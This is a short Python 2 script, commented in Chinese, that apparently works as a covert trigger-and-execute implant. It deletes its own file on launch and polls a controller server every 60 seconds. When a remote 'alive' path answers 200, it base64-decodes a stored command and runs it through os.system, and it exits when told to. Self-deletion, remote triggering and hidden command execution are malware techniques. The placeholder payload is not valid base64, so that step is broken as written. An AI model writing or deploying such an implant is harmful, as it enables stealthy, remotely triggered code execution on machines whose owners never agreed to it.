# -*- coding:utf-8 -*-
import base64
import os
import urllib2
from time import sleep

baseurl = "127.0.0.1:8000"
payload = "whoami"
flag = "111"
time = 60
i = 0

# 检测标准码


def rt(flag):
    try:
        response = urllib2.urlopen(
            'http://'+baseurl+'/'+flag, timeout=3).code
        html = response
        #print(html)
        return html
    # 捕获异常返回的错误码
    except urllib2.HTTPError as e:
        return e.code

# 检测exit码


def live():
    try:
        response2 = urllib2.urlopen(
            'http://'+baseurl+'/'+flag+'alive', timeout=3).code
        html = response2
        # 获取返回码
        #print(html)
        return html
    except urllib2.HTTPError as e:
        return e.code
# 获取文件名
filename = os.path.basename(__file__)
# 删除本身
os.remove("./"+filename)
while True:
    t1 = rt(flag)
    #print("t1的值是", t1)
    # sleep(time*3600)
    sleep(time)

    if t1 == 200:
        #print("标准码200，程序睡眠")
        pass
    else:
        #print("标准码是200，进入第二流程")
        t2 = live()
        #print("t2的值是", t2)
        if t2 == 200:
            if i == 1:
                # 跳出本次循环
                continue
            else:
            #print("EXIT码200，程序唤醒")
            # 将payload进行base64解码
                payload_d = base64.b64decode(payload).decode('utf-8')
                os.system(payload_d)
                i=1

        else:
            #print("EXIT404，程序自杀")
            # 获取文件名
            # filename = os.path.basename(__file__)
            # # 删除本身
            # os.remove("./"+filename)
            # #print("./"+filename)
            break
